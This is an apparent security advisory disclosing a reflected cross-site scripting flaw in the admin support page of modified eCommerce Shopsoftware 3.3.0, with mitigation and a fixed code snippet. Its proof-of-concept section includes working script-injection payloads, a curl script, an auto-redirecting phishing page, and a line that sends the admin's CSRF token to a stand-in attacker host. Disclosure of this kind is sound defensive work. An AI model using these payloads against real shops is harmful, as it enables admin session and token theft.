# Security Advisory: Reflected Cross-Site Scripting in admin/support.php

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** Medium
> **CVSS:** 4.8 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N`
> **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') — Reflected
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 contains a Reflected Cross-Site Scripting vulnerability in `admin/support.php`. The `GET module` parameter is reflected into the page within an HTML input value after being processed only by `xtc_db_input()`, which performs SQL escaping but does **not** perform HTML encoding. An attacker who can trick an admin into clicking a crafted link can execute JavaScript in the admin's browser session.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: admin/support.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://github.com/modified-shop/modified-shop
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

---

## 3. Vulnerability Description

`admin/support.php` checks for a `GET module` parameter and, if present, sets `$_POST['subject']` to a string that includes the module value via `strtoupper()`. This `$_POST['subject']` is later echoed into the page inside an HTML form field using `xtc_db_input()`, which applies `mysql_real_escape_string`-equivalent escaping (SQL-safe) but does not encode HTML special characters like `<`, `>`, `"`, or `'`.

**Root cause:**

```php
// admin/support.php:28–29
if (isset($_GET['module']) && $_GET['module'] != '') {
    $_POST['subject'] = 'Update '.strtoupper($_GET['module']);
}

// Later, echoed into the HTML form:
echo sprintf($data['field'], $data['name'], xtc_db_input($_POST[$data['name']]));
// xtc_db_input = SQL escape only — NOT htmlspecialchars()
// Result: <input type="text" name="subject" value="Update <PAYLOAD>">
```

An attacker crafts: `?module="><script>alert(document.cookie)</script>`

After `strtoupper()` and `xtc_db_input()`: the value becomes `Update "><SCRIPT>ALERT(DOCUMENT.COOKIE)</SCRIPT>` — the HTML tags are not escaped, breaking out of the `value=""` attribute and injecting JavaScript.

### Necessary Conditions

- **Authentication:** Admin
- **User interaction:** Required — admin must click the crafted link
- **Attack vector:** Network

---

## 4. Impact

- **Confidentiality:** Low — session cookies (if not HttpOnly), page content, admin tokens accessible
- **Integrity:** Low — arbitrary actions in the admin panel possible via scripted requests using the admin's session
- **Availability:** None

Scope is Changed (S:C) because the XSS runs in the victim's browser context, which is separate from the web application's server.

---

## 5. Classification

### CVSS

- **Score:** 4.8
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | High |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | Low |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE

- CWE-79: Improper Neutralization of Input During Web Page Generation (Reflected XSS)

### CAPEC

- CAPEC-86: XSS via HTTP Query Strings

---

## 6. Exploitation Scenario

1. Attacker crafts a URL targeting the admin panel: `/admin/support.php?module="><script>alert(1)</script>`
2. Attacker sends the URL to an admin via phishing, chat, or malicious redirect.
3. Admin clicks the link while authenticated.
4. Browser renders the page; `<script>alert(1)</script>` executes in the admin context.
5. Attacker can escalate to session hijacking, CSRF token theft, or admin action automation.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): admin/support.php (lines 28–29, form echo)
Parameter(s): module (GET)
Method: GET · Authentication: Admin required
```

### Example Request

```http
GET /admin/support.php?module=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

### Observed Response

```html
HTTP/1.1 200 OK

<input type="text" name="subject" value="Update "><SCRIPT>ALERT(DOCUMENT.COOKIE)</SCRIPT>">
```

### Result

Confirmed in authorized Docker lab. The `module` parameter value is reflected unencoded inside the HTML input attribute, allowing attribute breakout and script injection.

**Evidence:** `<script>` tag present unencoded in HTTP response body, executed by browser.

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V10 PoC — Reflected XSS in admin/support.php
TARGET="http://localhost:9080"
SID="<ADMIN_SESSION_ID>"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Payload: break out of value="" and inject script tag
PAYLOAD='"><script>alert(document.cookie)</script>'
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")

# Send the crafted request and check for unencoded reflection
curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "http://TARGET/admin/support.php?module=$ENCODED" | grep -i "script"

# Expected: <SCRIPT>ALERT(DOCUMENT.COOKIE)</SCRIPT> (or lowercase) in response
# Stealthy payload (no alert — exfiltrate CSRF token instead):
PAYLOAD2='"><script>fetch("http://attacker.com/?t="+document.querySelector("[name=securityToken]").value)</script>'
```

### HTML PoC (phishing link)

```html
<!-- Save as rxss_support.html and host on attacker server -->
<!-- When admin visits, the page redirects to the malicious admin URL -->
<!DOCTYPE html>
<html>
<head><title>Redirect</title></head>
<body>
<script>
// Auto-redirect to crafted admin URL
window.location = "http://TARGET/admin/support.php?module=%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E";
</script>
</body>
</html>
```

### Expected Result

```text
HTTP/1.1 200 OK
[Response body contains:]
<input type="text" name="subject" value="Update "><SCRIPT>ALERT(DOCUMENT.COOKIE)</SCRIPT>">
```

### PoC Limitations

- Requires admin authentication; reflected XSS only triggers if admin is logged in.
- Alert-based PoC is benign; no data exfiltration in this PoC.
- Does not cause service disruption.

---

## 9. Reproduction Steps

1. Log in as admin.
2. Navigate to `http://TARGET/admin/support.php?module=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E`
3. Browser executes `alert(1)` — confirm Reflected XSS.

---

## 10. Mitigation

- Wrap the echoed value with `htmlspecialchars(..., ENT_QUOTES, 'UTF-8')` before outputting to HTML.
- Use `xtc_draw_input_field()` or equivalent helper that encodes output — do not use `xtc_db_input()` for HTML output.

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// admin/support.php — Vulnerable:
echo sprintf($data['field'], $data['name'], xtc_db_input($_POST[$data['name']]));

// Fixed:
echo sprintf($data['field'], $data['name'],
    htmlspecialchars(xtc_db_input($_POST[$data['name']]), ENT_QUOTES, 'UTF-8'));
// Also: validate/restrict $_GET['module'] to alphanumeric
```

---

## 12. Detection and Indicators

- GET requests to `/admin/support.php` with `module` containing `<`, `>`, or `"` characters.

### Example Log Search

```text
grep "support.php" access.log | grep -E "module=.*%3C|module=.*<"
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via code review |
| 16/11/2026 | Confirmed in authorized lab |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending
- **Response status:** Awaiting response

---

## 15. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 16. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- CAPEC-86: https://capec.mitre.org/data/definitions/86.html
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- CVSS calculator: https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021-blip/Advisory
